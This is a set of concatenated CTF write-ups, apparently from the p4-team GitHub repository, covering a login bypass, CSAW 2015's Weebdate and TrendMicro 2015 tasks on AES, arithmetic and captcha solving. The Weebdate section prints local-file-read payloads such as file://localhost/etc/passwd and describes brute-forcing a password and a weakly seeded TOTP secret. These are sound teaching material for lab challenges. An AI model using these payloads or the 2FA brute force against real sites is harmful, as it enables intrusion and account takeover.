noticed that data from password field are hashed on webbrowser side before sending to the server.\n\n![](./1.png)\n\nTherefore we tried substituting fields values after the hashing operation. While the client-side verification was checking for empty password field, we could easily change the request parameters with Tampter Data and we checked what will happen if we send empty password for a random user...\n\n![](./2.png)\n\nBy doing this we basically went around all the traps set-up by authors of this task and we didn't have to spend out precious time on the analysis of PHP code of this website (which could be accessed by following a link in the source). Later analysis revealed that we exploited an actual vulnerability of the script, not the one the authors intended us to use :)", "timestamp": "2025-10-21T22:03:04.309008"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-16-csaw/web_500_weebdate/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-16-csaw/web_500_weebdate/README.md", "content": "## Weebdate (web, 500p, 69 solves)\n\n### PL Version\n`for ENG version scroll down`\n\nZadanie polegało na zdobyciu hasła oraz sekretnego kodu `TOTP` wykorzystywanego do podwójnej autentykacji dla użytkownika pewnego serwisu internetowego. Zadania nie udało nam sie finalnie rozwiązać, ale jedynie z braku czasu (znaleźliśmy kluczową podatność na kilka minut przed końcem CTFa). Niemniej kilkanaście minut więcej wystarczyłoby na uporanie się z zadaniem, bo wiedzieliśmy jak należy to zrobić. To co udało nam się ustalić jest na tyle wartościowe, że postanowiliśmy to opisać.\n\nHasło użytkownika można było uzyskać za pomocą słownikowego brute-force, ponieważ strona informowała nas czy niepoprawne podaliśmy hasło czy kod weryfikujący. W efekcie nawet bez kodu mogliśmy spokojnie brute-forceować samo hasło.\nProblemem był sekretny kod pozwalający na generowanie kodów TOTP. Udało nam się zaobserwować, że kod jest generowany na bazie pierwszych 4 znaków loginu oraz adresu IP, ale nie wiedzieliśmy nadal w jaki sposób powstaje kod. Nie wiedzieliśmy także skąd wziąć adres IP użytkownika (niemniej przypuszczaliśmy że tylko fragment adresu IP jest brany pod uwagę i możliwe że tu także będzie się dało coś wykonać prostym brute-force).\n\nW zadaniu szukaliśmy podatności dość długo analizując wszelkie aspekty jakie przychodziły nam do głowy - SQL Injection, Cookies, XSS...\nKluczem do zadania okazał się formularz edycji naszego profilu gdzie mogliśmy podać link do pliku z awatarem. Serwer próbował otworzyć ten plik w trakcie zapisywania zmian w profilu ale nie obsługiwał błędów w sposób poprawny, niewidoczny dla użytkownika. \nW efekcie podanie niepoprawnego URLa wyświetlało nam kilka cennych informacji - językiem w którym napisana była strona był `python` a awatar był otwierany przez `urllib.urlopen()`. Dodatkowo podanie ścieżki do pliku który nie jest obrazkiem powodowało wyświetlenie `zawartości tego pliku w logu błędu`.\nIstotnym aspektem funkcji urllib.urlopen() jest to, że można ona otwierać nie tylko pliki zdalne ale także `lokalne`. \nPierwsze próby były nieudane ponieważ próba otwarcia pliku z lokalnej ścieżki kończyła sie błędem. Okazało się, że server wymaga podania parametru `netpath`, więc dodajemy `localhost` do naszej lokalnej ścieżki i próbujemy otworzyć:\n`file://localhost/etc/passwd`\n\n![](./exploit.png)\n\nOperacja zakończyła się powodzeniem więc wiedzieliśmy, że mamy możliwość czytania plików na serwerze. Zaczęliśmy od sprawdzenia gdzie jest uruchomiona aplikacja którą sie zajmujemy. Czytanie:\n`file://localhost/proc/self/cmdline`\nPozwoliło stwierdzić że jest to `/usr/sbin/apache2-kstart`\nPrzeanalizowaliśmy więc pliki konfiguracyjne:\n`file://localhost/etc/apache2/ports.conf`\n\n![](./apache1.png)\n\n`file://localhost/etc/apache2/sites-enabled/000-default.conf`\n\n![](./apache2.png)\n\nCo pozwoliło nam poznać ścieżkę do aplikacji. Następnie wyświetliśmy zawartość pliku `server.py` który wykorzystywał plik `utils.py`\n`file://localhost/var/www/weeb/server.py`\n`file://localhost/var/www/weeb/utils.py`\n\nW pliku `utils.py` znajdujemy brakujący element układanki:\n```\ndef generate_seed(username, ip_address): \n\treturn int(struct.unpack(\"I\", socket.inet_aton(ip_address))[0]) + struct.unpack(\"I\", username[:4].ljust(4,\"0\"))[0] \n\ndef get_totp_key(seed): \n\trandom.seed(seed) return pyotp.random_base32(16, random)\n```\nWidzimy, że nasze przypuszczenia były słuszne - pod uwagę branę są 4 pierwsze litery loginu oraz pierwszy oktet adresu IP. Ale widzimy także w jaki sposób te dane są wykorzystywane - oba elementy są rzutowane do intów i dodawane a następnie wykorzystywane jako seed dla randoma.\nNiestety na tym etapie skończył się nam czas. Niemniej rozwiązanie z tego miejsca jest już zupełnie oczywiste:\nZnamy login ofiary a jeden oktet IP ma zaledwie 255 potencjalnych wartości. Możemy więc wygenerować wszytskie potencjalne sekretne klucze a następnie wykorzystać je w połączeniu z poznanym hasłem do brute-forcowania formularza logowania - końcu testujemy zaledwie 255 możliwości.\n\n### ENG Version\n\nThe challenge was to find a password and a secret `TOTP` code for two factor authentication of a certain dating website. We didn't manage to get flag for this task, however only for the lack of time (we found the key vulnerability just a couple of minutes before the CTF ended). Nevertheless we could have done it with some more time, because we knew exacly how to proceed. We consider work on this task worth of a write-up.\n\nThe password could have been extracted using a dictionary brute-force approach since the website was informing us if the password for incorrect or if the user&pass where correct if the verification code was wrong. This means you could simply brute-force only password to begin with.\nThe real issue was to get the secret for TOTP code generation. We managed to notice that the code takes into consideration only first 4 letters of login and the IP address of the user but we didn't know how those values become the secret. We also didn't know how to get the IP address of the user (we did suspect that only a part of the IP is used and maybe this could be brute-forced as well).\n\nWe tried for a long time to find some vulnerabilities using standard approach - SQL Injection, Cookies analysis, XSS...\nThe key to the task was the form for editing user profile, where we could supply a link to a picture with avatar. The server after submitting a new avatar link was trying to access the file and the error handling was not done properly - user could see part of the error message.\nThis enables us to realise that the server is running on `python` and that avatar is opened using `urllib.urlopen()`. Supplying a path to a non-picture file was also displaying `contents of the file in the error message`.\nIt is worth noting that urllib.urlopen() function can be used to open both remote and `local files`.\nFirst attempts were unsuccessful and we got an error. It seemed that server is validating if `netpath` parameter is specified to make sure that someone is not opening a local file. So we supply the `localhost` parameter and try again with:\n`file://localhost/etc/passwd`\n\n![](./exploit.png)\n\nThis operation was finally successful and we were sure we can read files on the server. We started off with checking what are we actually runing:\n`file://localhost/proc/self/cmdline`\nThis leads us to realise we are running on `/usr/sbin/apache2-kstart`\nSo we analysed apache config files:\n`file://localhost/etc/apache2/ports.conf`\n\n![](./apache1.png)\n\n`file://localhost/etc/apache2/sites-enabled/000-default.conf`\n\n![](./apache2.png)\n\nWhich gave us the location for the application we are interested in. Next we dump `server.py` file which was importing `utils.py`\n`file://localhost/var/www/weeb/server.py`\n`file://localhost/var/www/weeb/utils.py`\n\nAnd in `utils.py` we find the missing piece to our problem:\n```\ndef generate_seed(username, ip_address): \n\treturn int(struct.unpack(\"I\", socket.inet_aton(ip_address))[0]) + struct.unpack(\"I\", username[:4].ljust(4,\"0\"))[0] \n\ndef get_totp_key(seed): \n\trandom.seed(seed) return pyotp.random_base32(16, random)\n```\nWe can see that our assumptions were correct - only first 4 letters of the login are taken into consideration and first octet of IP address. We can also finally see how those data are used - casted to int, added and used as seed for random.\nUnfortunately this was the moment when our time run out. Still, from this point the rest of the solution is quite clear:\nWe know the login and single IP octet has only 255 values. We can simply generate all potential secrets and brute-force the login using our brute-forced password.", "timestamp": "2025-10-21T22:03:04.638440"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-26-trendmicro/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/README.md", "content": "# Writeup TrendMicro CTF 2015\n\nUczestniczyliśmy (Shalom, msm, Rev, other019, nazywam i graszka22) w TrendMicro CTF, i znowu spróbujemy opisać zadania z którymi walczyliśmy (a przynajmniej te, które pokonaliśmy).\n\nOgólne wrażenia:\n\n* Zadania były podzelone na nietypowe kategorie, niemniej same zadania specjalnie nie odbiegały od standardu. Utrudniało to jednak wybranie \"swoich\" zadań. Organizatorzy nie chcieli pewnie, żeby ich klienci widzieli że w konkursie są kategorie typu \"binary exploitation\" czy \"web hacking\" więc nazwali je bp. \"analysis-offensive\"\n* Organizatorzy zrobili zadanie za 100p z krzyżówką gdzie wszystkie pytania dotyczyły ich firmy, np. \"jak nazywa sie CEO\", \"w którym roku powstała\", \"jak sie nazywa produkt do...\" ;]\n\nW spisie treci umieszczamy 2 klasyfikacje typu zadania - standardową (eg. forensics, reverse, pwn, web, ppc, crypto) oraz tą proponowaną przez organizatorów (Analysis-others, Analysis-defensive, Analysis-offensive, Programming, Misc, Cryptography).\n\n# Spis treści:\n\n* [Calculator (ppc/Programming 200)](calculator)\n* [Colors (ppc/Programming 100)](colors)\n* [Captcha (ppc/Misc 300)](captcha)\n* [RSA (crypto/Cryptography 100)](rsa)\n* [AES (crypto/Cryptography 200)](aes)\n* [Maze (ppc/Programming 300)](maze)\n* [Offensive 100 (web/Analysis-offensive 100)](offensive100)\n* [Defense 100(reverse/Analysis-defensive 100)](defense100)\n* [Other 100 (forensics/Analysis-other 100)](other100)\n\n\n# Zakończenie\n\nZachęcamy do komentarzy/pytań/czegokolwiek.\n", "timestamp": "2025-10-21T22:03:05.267696"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-26-trendmicro/aes/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/aes/README.md", "content": "## AES (crypto, 200p)\n\n### PL Version\n`for ENG version scroll down`\n\nZadanie polegało na odzyskaniu wektora inicjalizacyjnego IV dla szyfru AES na podstawie znajomości wiadomości, części klucza oraz części zaszyfrowanego tekstu. Dane były przekazane za pomocą pomazanego zdjęcia kodu:\n\n![](./q.png)\n\nWynika z nich że dysponujemy:\n\n* Częścią klucza `5d6I9pfR7C1JQt` z brakującymi ostatnimi 2 bajtami\n* Wiadomością `The message is protected by AES!`\n* Fragmentem zaszyfrowanego tekstu `fe000000000000000000000000009ec3307df037c689300bbf2812ff89bc0b49` (przez 0 oznaczam padding nieznanych elementów)\n\nPierwszy krokiem, po zapoznaniu się z zasadą działania szyfrowania AES w zadanej konfiguracji, było odzyskanie całego klucza. Warto zauważyć że nasza wiadomość stanowi 2 bloki dla szyfru, każdy po 16 bajtów:\n\n\tThe message is p\n\trotected by AES!\n\nA szyfrowanie odbywa się blokami, więc nasz zaszyfrowany tekst także możemy podzielić na bloki:\n\n\tfe000000000000000000000000009ec3\n\t307df037c689300bbf2812ff89bc0b49\n\t\t\nDo szyfrowania pierwszego bloku AES używa wektora IV oraz klucza, ale do szyfrowania kolejnego bloku użyty jest tylko poprzedni zaszyfrowany blok oraz klucz. Dodatkowo szyfrowane odbywa się bajt po bajcie co oznacza, że deszyfrowanie 1 bajtu 2 bloku wymaga znajomości jedynie klucza oraz 1 bajtu 1 bloku. \n\nTo oznacza, że dla danych:\n\n\tXX000000000000000000000000000000\n\tYY000000000000000000000000000000\n\nDeszyfrowanie za pomocą poprawnego klucza pozwoli uzyskać poprawnie odszyfrowany 16 bajt wiadomości (licząc od 0), niezależnie od wektora IV.\nW związku z tym próbujemy przetestować wszystkie możliwości ostatnich 2 znaków klucza, sprawdzając dla których deszyfrowany tekst zawiera odpowiednie wartości w drugim bloku na pozycjach na których w pierwszym bloku mamy ustawione poprawne wartości (pierwszy bajt oraz dwa ostatnie):\n\n\tKEY = \"5d6I9pfR7C1JQt\"\n\tIV = \"0000000000000000\"\n\t\n\tdef valid_key(correct_bytes, decrypted):\n    for byte_tuple in correct_bytes:\n        if decrypted[byte_tuple[0]] != byte_tuple[1]:\n            return False\n    return True\n\t\n\tdef break_key(key_prefix, encoded_message_part, correct_bytes):\n\t\tfinal_key = \"\"\n\t\tencrypted = encoded_message_part\n\t\tfor missing1 in range(0, 256):\n\t\t\tkey = key_prefix + chr(missing1)\n\t\t\tfor missing2 in range(0, 256):\n\t\t\t\treal_key = key + chr(missing2)\n\t\t\t\tdecrypted = decrypt(real_key, IV, binascii.unhexlify(encrypted))\n\t\t\t\tif valid_key(correct_bytes, decrypted):\n\t\t\t\t\tfinal_key = real_key\n\t\treturn final_key\n\n\treal_key = break_key(KEY, \"fe000000000000000000000000009ec3307df037c689300bbf2812ff89bc0b49\", [(16, \"r\"), (30, \"S\"), (31, \"!\")])\n\nUzyskujemy w ten sposób klucz: `5d6I9pfR7C1JQt7$`\n\nWektor IV którego poszukujemy służy do szyfrowania 1 bloku i opiera się na podobnej zasadzie jak szyfrowanie kolejnych bloków przedstawione wyżej - pierwszy bajt pierwszego bloku zależy od pierwszego bajtu wektora IV, drugi od drugiego itd. Żeby móc w takim razie odzyskać wektor IV potrzebujemy znać pierwszy blok zaszyfrowanej wiadomości. W tym celu stosujemy zabieg identyczny jak powyżej, ale tym razem próbujemy dopasować kolejne bajty zaszyfrowanego pierwszego bloku wiadomości, sprawdzając kiedy deszyfrowanie daje nam poprawnie deszyfrowany bajt z drugiego bloku:\n\n\tIV = \"0000000000000000\"\n\tmessage = \"The message is protected by AES!\"\n\tciphertext = \"\"\n\tencrypted = \"00000000000000000000000000000000307df037c689300bbf2812ff89bc0b49\"\n\tdata = binascii.unhexlify(encrypted)\n\tfor position in range(16): # going through first block\n\t\tencrypted_sub = list(data)\n\t\tfor missing in range(0, 256):\n\t\t\tencrypted_sub[position] = chr(missing) #encrypted message with single byte in first block set to tested value\n\t\t\tdecrypted = decrypt(real_key, IV, \"\".join(encrypted_sub))\n\t\t\tif decrypted[position + 16] == message[position + 16]:\n\t\t\t\tprint(\"%d %d\" % (position, missing))\n\t\t\t\tprint(decrypted[position + 16])\n\t\t\t\tciphertext += chr(missing)\n\tprint(binascii.hexlify(ciphertext))\n\nCo daje nam: `fe1199011d45c87d10e9e842c1949ec3` i jest to pierwszy zakodowany blok.\n\nOstatnim krokiem jest odzyskanie wektora IV. Robimy to identycznym schematem, tym razem testujemy kolejne bajty wektora IV sprawdzając kiedy deszyfrowanie daje nam poprawnie odszyfrowane wartości z 1 bloku:\n\n\tiv_result = \"\"\n\tencrypted = \"fe1199011d45c87d10e9e842c1949ec3\"\n\tfor position in range(16):\n\t\tiv = list(IV)\n\t\tfor missing in range(0, 256):\n\t\t\tiv[position] = chr(missing) # IV with single byte set to tested value\n\t\t\tdecrypted = decrypt(real_key, \"\".join(iv), binascii.unhexlify(encrypted))\n\t\t\tif decrypted[position] == message[position]:\n\t\t\t\tprint(\"%d %d\" % (position, missing))\n\t\t\t\tiv_result += chr(missing)\n\tprint(iv_result)\n\nCo daje nam `Key:rVFvN9KLeYr6` więc zgodnie z treścią zadania flagą jest `TMCTF{rVFvN9KLeYr6}`\n\n### ENG Version\n\nThe task was to recover initialization vector IV for AES cipher based on knowledge of the message, part of the key and part of ciphertext. The data were proviede as a photo of crossed-out code:\n\n![](./q.png)\n\nFrom this we can get:\n\n* Part of the key: `5d6I9pfR7C1JQt` with missing 2 bytes\n* Message: `The message is protected by AES!`\n* Part of ciphertext: `fe000000000000000000000000009ec3307df037c689300bbf2812ff89bc0b49` (0s in the first block are missing part)\n\nFirst step, after reading about AES in given configuration, was to extract the whole ciper key. It is worth noting that our message is separated into 2 blocks for this cipher, each with 16 bytes:\n\n\tThe message is p\n\trotected by AES!\n\nAnd the cipher works on blocks, so our ciphertext can also be split into blocks:\n\n\tfe000000000000000000000000009ec3\n\t307df037c689300bbf2812ff89bc0b49\n\t\t\nFor encoding the first block AES uses IV vector and the key, but to encode second block only previous block and the key is used. On top of that the cipher works byte-by-byte which means that deciphering 1 byte of 2 block requires knowledge only of the key and of the 1 byte of 1 block.\n\nIt means that for input:\n\n\tXX000000000000000000000000000000\n\tYY000000000000000000000000000000\n\nDeciphering usign a proper key will give us properly decoded 16th byte (counting from 0), regardless of IV vector used.\nTherefore, we test all possible values for the missing 2 key characters, testing for which of them the decipered text has proper values in the second block on the positions where in the first block we have proper values (first byte and last two bytes):\n\n\tKEY = \"5d6I9pfR7C1JQt\"\n\tIV = \"0000000000000000\"\n\t\n\tdef valid_key(correct_bytes, decrypted):\n    for byte_tuple in correct_bytes:\n        if decrypted[byte_tuple[0]] != byte_tuple[1]:\n            return False\n    return True\n\t\n\tdef break_key(key_prefix, encoded_message_part, correct_bytes):\n\t\tfinal_key = \"\"\n\t\tencrypted = encoded_message_part\n\t\tfor missing1 in range(0, 256):\n\t\t\tkey = key_prefix + chr(missing1)\n\t\t\tfor missing2 in range(0, 256):\n\t\t\t\treal_key = key + chr(missing2)\n\t\t\t\tdecrypted = decrypt(real_key, IV, binascii.unhexlify(encrypted))\n\t\t\t\tif valid_key(correct_bytes, decrypted):\n\t\t\t\t\tfinal_key = real_key\n\t\treturn final_key\n\n\treal_key = break_key(KEY, \"fe000000000000000000000000009ec3307df037c689300bbf2812ff89bc0b49\", [(16, \"r\"), (30, \"S\"), (31, \"!\")])\n\nThis way we get the key: `5d6I9pfR7C1JQt7$`\n\nIV vector we are looking for is used to encode 1 block and it is used on the same principle as encoding next blocks decribed above - encoded 1 byte of 1 block depends on 1 byte of 1 block of IV vector, 2 depends on 2 etc. Therefore, to be able to get the IV vector we need to know the whole first encoded block. To get it we use a very similar approach as the one we used to get the key, but this time we test bytes of the encoded 1 block, checking which value after decoding gives us properly decoded byte from 2 block:\n\n\tIV = \"0000000000000000\"\n\tmessage = \"The message is protected by AES!\"\n\tciphertext = \"\"\n\tencrypted = \"00000000000000000000000000000000307df037c689300bbf2812ff89bc0b49\"\n\tdata = binascii.unhexlify(encrypted)\n\tfor position in range(16): # going through first block\n\t\tencrypted_sub = list(data)\n\t\tfor missing in range(0, 256):\n\t\t\tencrypted_sub[position] = chr(missing) #encrypted message with single byte in first block set to tested value\n\t\t\tdecrypted = decrypt(real_key, IV, \"\".join(encrypted_sub))\n\t\t\tif decrypted[position + 16] == message[position + 16]:\n\t\t\t\tprint(\"%d %d\" % (position, missing))\n\t\t\t\tprint(decrypted[position + 16])\n\t\t\t\tciphertext += chr(missing)\n\tprint(binascii.hexlify(ciphertext))\n\nWhich gives us: `fe1199011d45c87d10e9e842c1949ec3` and this is the encoded 1 block.\n\nLast step is to recover IV vector. We use the same principle, this time testing IV vector bytes, checking when deciphering gives us properly decoded values from 1 block:\n\n\tiv_result = \"\"\n\tencrypted = \"fe1199011d45c87d10e9e842c1949ec3\"\n\tfor position in range(16):\n\t\tiv = list(IV)\n\t\tfor missing in range(0, 256):\n\t\t\tiv[position] = chr(missing) # IV with single byte set to tested value\n\t\t\tdecrypted = decrypt(real_key, \"\".join(iv), binascii.unhexlify(encrypted))\n\t\t\tif decrypted[position] == message[position]:\n\t\t\t\tprint(\"%d %d\" % (position, missing))\n\t\t\t\tiv_result += chr(missing)\n\tprint(iv_result)\n\nWhich gives us: `Key:rVFvN9KLeYr6` so according to the task rules the flag is `TMCTF{rVFvN9KLeYr6}`\n", "timestamp": "2025-10-21T22:03:05.594870"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-26-trendmicro/calculator/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/calculator/README.md", "content": "## Calculator (ppc/Programming, 200p)\n\n### PL Version\n[click for ENG](#eng-version)\n\nZadanie polegało na połączeniu się za pomocą NC z podanym serwerem. Serwer podawał na wejściu działania i oczekiwał na ich rozwiązania. Należało rozwiązać kilkadziesiąt przykładów pod rząd aby uzyskać flagę. Działania przychodzące z serwera miały postać:\n\n`eight hundred ninety nine million, one hundred sixty eight thousand eleven - 556226 * ( 576 - 21101236 ) * 948 - ( 29565441 + thirty six ) * 182,745 - 6,124,792 + CMLXXVI - 647 =`\n\nNa co serwer w odpowiedzi oczekiwał na: `11121023402232863`\n\nZadanie rozwiązaliśmy wykorzystując parser liczb słownych, parser liczb rzymskich oraz pythonową funkcję `eval()`.\nSame transformacje są raczej trywialne i łatwie do znalezienia w internecie (cały skrypt [tutaj](calculator.py) ), reszta solvera to:\n\n\tdef solve(data):\n\t\tfixed = data.replace(\",\", \"\") #turn 3,200 into 3200\n\t\tfixed = \" \" + fixed #ensure word boundary on the left\n\t\tromans = re.findall(\"[^\\d=\\\\-\\\\+/\\\\*\\\\(\\\\)\\s]+\", fixed)\n\t\tfor romanNumber in romans:\n\t\t\ttry:\n\t\t\t\tnumber = str(fromRoman(romanNumber))\n\t\t\t\tfixed = re.sub(r\"\\b%s\\b\" % romanNumber, number, fixed)\n\t\t\texcept:\n\t\t\t\tpass\n\t\tliterals = re.findall(\"[^\\d=\\\\-\\\\+/\\\\*\\\\(\\\\)]+\", fixed)\n\t\tfor literal in sorted(literals, key=lambda x: len(x), reverse=True):\n\t\t\tif literal != ' ' and literal != \"\":\n\t\t\t\ttry:\n\t\t\t\t\tnumber = str(text2int(literal))\n\t\t\t\t\tfixed = re.sub(r\"\\b%s\\b\" % literal.strip(), number, fixed)\n\t\t\t\texcept:\n\t\t\t\t\tpass\n\t\treturn eval(fixed[:-2]) #omit \" =\"\n\nCzyli w skrócie:\n\n* Usuwamy przecinki będące separatorami tysiąców\n* Zamieniamy wszystkie znalezione liczby rzymskie na arabskie\n* Zamieniamy wszystkie znalezione literały na liczby arabskie (uwaga: trzeba zamieniać od tych najdłuższych, żeby np. zamiana \"one\" nie była plikowana do \"fifty one\")\n* Usuwamy znak `=` z końca\n* Ewaluujemy wyrażenie\n\nPo kilkudziesieciu przykładach dostajemy: `Congratulations!The flag is TMCTF{U D1D 17!}`\n\n### ENG Version\n\nThe challenge was to connect to a server via NC. Server was providing equations and was waiting for their solutions. We had to solve few dozens consecutively in order to get the flag. The equations were for example:\n\n`eight hundred ninety nine million, one hundred sixty eight thousand eleven - 556226 * ( 576 - 21101236 ) * 948 - ( 29565441 + thirty six ) * 182,745 - 6,124,792 + CMLXXVI - 647 =`\n\nAnd server was expecting a solution: `11121023402232863`\n\nWe solved this using literal nubmbers parser, roman numbers parser and python `eval()` function.\nThe parsers are trivial and easy to find on the internet (whole script [here](calculator.py) ), the rest was:\n\n\tdef solve(data):\n\t\tfixed = data.replace(\",\", \"\") #turn 3,200 into 3200\n\t\tfixed = \" \" + fixed #ensure word boundary on the left\n\t\tromans = re.findall(\"[^\\d=\\\\-\\\\+/\\\\*\\\\(\\\\)\\s]+\", fixed)\n\t\tfor romanNumber in romans:\n\t\t\ttry:\n\t\t\t\tnumber = str(fromRoman(romanNumber))\n\t\t\t\tfixed = re.sub(r\"\\b%s\\b\" % romanNumber, number, fixed)\n\t\t\texcept:\n\t\t\t\tpass\n\t\tliterals = re.findall(\"[^\\d=\\\\-\\\\+/\\\\*\\\\(\\\\)]+\", fixed)\n\t\tfor literal in sorted(literals, key=lambda x: len(x), reverse=True):\n\t\t\tif literal != ' ' and literal != \"\":\n\t\t\t\ttry:\n\t\t\t\t\tnumber = str(text2int(literal))\n\t\t\t\t\tfixed = re.sub(r\"\\b%s\\b\" % literal.strip(), number, fixed)\n\t\t\t\texcept:\n\t\t\t\t\tpass\n\t\treturn eval(fixed[:-2]) #omit \" =\"\n\nSo in short:\n\n* We remove thousands separator `,`\n* We turn all roman numbers into integers\n* We turn all literal numbers into integers (notice: you need to replace starting from longest numbers so that for example replacing \"one\" doesn't affect \"fifty one\")\n* We remove `=` from the end\n* We evaluate the expression\n\nAfter mutiple examples we finally get:`Congratulations!The flag is TMCTF{U D1D 17!}`\n", "timestamp": "2025-10-21T22:03:05.853004"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-09-26-trendmicro/captcha/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-09-26-trendmicro/captcha/README.md", "content": "## Captcha (ppc/Misc, 300p)\n\n### PL Version\n`for ENG version scroll down`\n\nZadanie polegało na rozwiązaniu 500 kodów captcha poprawnie pod rząd, przy czym można było pomijać których nie chcieliśmy rozwiązywać captche. Serwowane kody miały postać:\n\n![](./captcha.png)\n\nW celu rozwiązania zadania napisaliśmy skrypt w pythonie korzystając z Python Images Library, pytesseract oraz Tesseracta. Niemniej wymóg 500 bezbłędnych rozwiązań pod rząd wymagał zastosowania pewnych heurystyk aby ocenić czy zdekodowane przez nas słowo jest aby na pewno poprawne.\n\nCały skrypt dostępy jest [tutaj](captcha.py).\n\nDziałanie skryptu:\nNa początek usuwane są różnokolorowe pionowe kreski. W tym celu pobieramy rozkład kolorów dla pikseli i odszukujemy dwa dominujące kolory - wypełnienie oraz tekst captchy (pomijamy kolor biały) a następnie skanujemy obraz i każdy piksel innego koloru niż 2 dominujące jest zamieniany na dominujący. Jeśli piksel sąsiaduje z pikselami o kolorze tekstu wybieramy ten kolor, jeśli nie używamy koloru wypełnienia.\nWykonujemy to skryptem:\n\n\tdef get_filling(pixels, i, j, best_colors, x_range):\n\t\tleft = pixels[(i - 1) % x_range, j]\n\t\tright = pixels[(i + 1) % x_range, j]\n\t\tif left in best_colors and left != best_colors[0]:\n\t\t\treturn left\n\t\telif right in best_colors and right != best_colors[0]:\n\t\t\treturn right\n\t\telse:\n\t\t\treturn best_colors[0]\n\n\n\tdef fix_colors(im):\n\t\tcolors_distribution = im.getcolors()\n\t\tordered = sorted(colors_distribution, key=lambda x: x[0], reverse=True)\n\t\tbest_colors = [color[1] for color in ordered]\n\t\tif (255, 255, 255) in best_colors:\n\t\t\tbest_colors.remove((255, 255, 255))\n\t\tbest_colors = best_colors[:2]\n\t\tpixels = im.load()\n\t\tfor i in range(im.size[0]):\n\t\t\tfor j in range(im.size[1]):\n\t\t\t\tcolor = pixels[i, j]\n\t\t\t\tif color not in best_colors:\n\t\t\t\t\tpixels[i, j] = get_filling(pixels, i, j, best_colors, im.size[0])\n\t\treturn best_colors[0]\n\n\nW efekcie z powyższego obrazu uzyskujemy:\n\n![](./nostripes.png)\n\nNastępnym krokiem jest zamiana kolorów obrazu w celu zwiększenia kontrastu i ułatwienia pracy OCRa. Skanujemy obraz i każdy piksel o kolorze wypełnienia zamieniamy na biały a piksel i kolorze tekstu na czarny. \n\n\tdef black_and_white(im, filling):\n\t\tblack = (0, 0, 0)\n\t\twhite = (255, 255, 255)\n\t\tpixels = im.load()\n\t\tfor i in range(im.size[0]):\n\t\t\tfor j in range(im.size[1]):\n\t\t\t\tcolor = pixels[i, j]\n\t\t\t\tif color == filling:\n\t\t\t\t\tpixels[i, j] = white\n\t\t\t\telse:\n\t\t\t\t\tpixels[i, j] = black\n\nW efekcie uzyskujemy:\n\n![](./fixed.png)\n\nTak przygotowany obraz skanujemy za pomocą Tesseracta a potem wynik oceniamy za pomocą heurystyki:\n\n\tdef on_blacklist(text):\n\t\tif len(text) != 4:\n\t\t\treturn True\n\t\tblacklisted = [\"I\", \"0\", \"O\", \"Z\", \"Q\", \"2\", \"S\", \"3\", \"G\", \"9\", \"1\", \"l\", \"C\", \"X\", \"V\", \"B\", \"8\", \"U\"]\n\t\tfor character in blacklisted:\n\t\t\tif character in text:\n\t\t\t\treturn True\n\t\tmatcher = re.match(\"[a-zA-Z0-9]+\", text)\n\t\tif matcher is None or len(matcher.group()) != 4:\n\t\t\treturn True\n\t\treturn False\n\nOdrzucamy wszystkie rozwiązania które nie mają 4 symboli z zakresu `[a-zA-Z0-9]` bo wiemy że wszystkie captche powinny mieć 4 symbole alfanumeryczne. Dodatkowo odrzucamy wszystkie rozwiązania zawierające ryzykowne symbole:\n\n* Tesseract często myli ze sobą: `O0Q`, `2Z`, `B8S`, `Il1`, `6G`, `9g`\n* Tesseract często niepopranie rozpoznaje wielkość liter - jeśli podaje małą literę to jest ok, ale jeśli podaje dużą literę nie możemy mieć pewności. Odrzucamy więc wszystkie symbole których mała i duża wersja jest zbyt podobna: `XVUCSZO`\n\nW ten sposób uzyskujemy solver ze 100% skutecznością, chociaż działa on bardzo wolno, bo odrzuca 90% testowanych kodów captcha.\nPo rozwiązaniu wszystkich 500 przykładów dostajemy:\n\n![](./solved.png)\n\n### ENG Version\n\nThe challenge was to correctly solve 500 consecutive captcha codes, with the ability to skip codes we didn't want to solve. Codes looked like this:\n\n![](./captcha.png)\n\nIn order to solve this we prepared a python script using Python Images Library, pytesseract and Tesseracta. However the 500 consecutive correct answers required some special processing and heuristics to score the solution and decide if it's correct or not.\n\nWhole script is available [here](captcha.py).\n\nThe script works as follows:\nFirst we remove the colorful vertical lines. For this we get the color distribution of image pixels and we get the two dominant colors - filling and text (skipping white) and then we scan the picture and if a pixel has different color than the 2 dominants, we change it to dominant. If it is next to text-color pixel we choose text-color, otherwise we use filling color.\nWe do this with:\n\n\tdef get_filling(pixels, i, j, best_colors, x_range):\n\t\tleft = pixels[(i - 1) % x_range, j]\n\t\tright = pixels[(i + 1) % x_range, j]\n\t\tif left in best_colors and left != best_colors[0]:\n\t\t\treturn left\n\t\telif right in best_colors and right != best_colors[0]:\n\t\t\treturn right\n\t\telse:\n\t\t\treturn best_colors[0]\n\n\n\tdef fix_colors(im):\n\t\tcolors_distribution = im.getcolors()\n\t\tordered = sorted(colors_distribution, key=lambda x: x[0], reverse=True)\n\t\tbest_colors = [color[1] for color in ordered]\n\t\tif (255, 255, 255) in best_colors:\n\t\t\tbest_colors.remove((255, 255, 255))\n\t\tbest_colors = best_colors[:2]\n\t\tpixels = im.load()\n\t\tfor i in range(im.size[0]):\n\t\t\tfor j in range(im.size[1]):\n\t\t\t\tcolor = pixels[i, j]\n\t\t\t\tif color not in best_colors:\n\t\t\t\t\tpixels[i, j] = get_filling(pixels, i, j, best_colors, im.size[0])\n\t\treturn best_colors[0]\n\nWith this code, from the catpcha above we get:\n\n![](./nostripes.png)\n\nNext step is changing the colors to raise contrast and make life easier for OCR engine. We scan the picture and the color of all filling-color pixels change to white and text-color to black.\n\n\tdef black_and_white(im, filling):\n\t\tblack = (0, 0, 0)\n\t\twhite = (255, 255, 255)\n\t\tpixels = im.load()\n\t\tfor i in range(im.size[0]):\n\t\t\tfor j in range(im.size[1]):\n\t\t\t\tcolor = pixels[i, j]\n\t\t\t\tif color == filling:\n\t\t\t\t\tpixels[i, j] = white\n\t\t\t\telse:\n\t\t\t\t\tpixels[i, j] = black\n\nAs a result we get:\n\n![](./fixed.png)\n\nPicture prepared like that we pass to 